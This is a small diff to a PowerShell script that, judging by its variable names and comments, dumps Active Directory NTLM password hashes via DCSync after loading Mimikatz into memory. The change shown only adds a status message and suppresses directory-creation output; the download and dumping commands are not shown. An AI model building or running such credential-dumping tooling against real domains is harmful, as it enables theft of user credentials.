@@ -10,7 +10,8 @@ $USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users" + $EXT
 $IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import" + $EXT
 
 # create directory for storage
-New-Item -ItemType Directory -Force -Path $PATH
+Write-Host "[INFO] Creating new directory at $PATH" -ForegroundColor Gray
+New-Item -ItemType Directory -Force -Path $PATH | Out-Null
 
 # download mimikatz into memory
 Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
